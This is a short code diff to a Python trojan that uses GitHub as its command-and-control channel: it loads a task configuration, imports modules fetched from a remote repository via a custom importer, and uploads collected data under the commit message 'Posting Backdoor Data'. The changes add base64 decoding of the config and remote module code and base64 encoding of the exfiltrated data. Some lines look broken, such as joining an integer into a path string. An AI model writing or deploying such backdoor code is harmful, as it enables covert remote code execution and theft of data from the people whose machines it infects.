@@ -58,11 +58,11 @@ def get_file_contents(filepath):
 def get_trojan_config():
     global configured;
     
-    config_json = get_file_contents("config/abc.json");
+    config_json = get_file_contents("abc.json");
     
     print(config_json);
 
-    config = json.loads(get_file_contents("config/abc.json"));
+    config = json.loads(config_json);
     
     configured = True
 
@@ -70,12 +70,12 @@ def get_trojan_config():
         if task['module'] not in sys.modules:
             exec("import "+task['module'])
 
-    return config
+    return base64.b64decode(config)
 
 def store_module_result(data) :
     gh,repo,branch = connect_to_github()
     remote_path = "data/"+trojan_id+"/"+random.randint(1000,100000)+".data";
-    repo.create_file(remote_path,"Posting Backdoor Data",data)
+    repo.create_file(remote_path,"Posting Backdoor Data",base64.b64encode(data))
 
     return
 
@@ -90,7 +90,7 @@ class gitimporter(object):
              new_library = get_file_contents("modules/"+fullname);
 
              if new_library is not None:
-                 self.current_module_code = new_library
+                 self.current_module_code = base64.b64decode(new_library);
                  return self
          return None
     
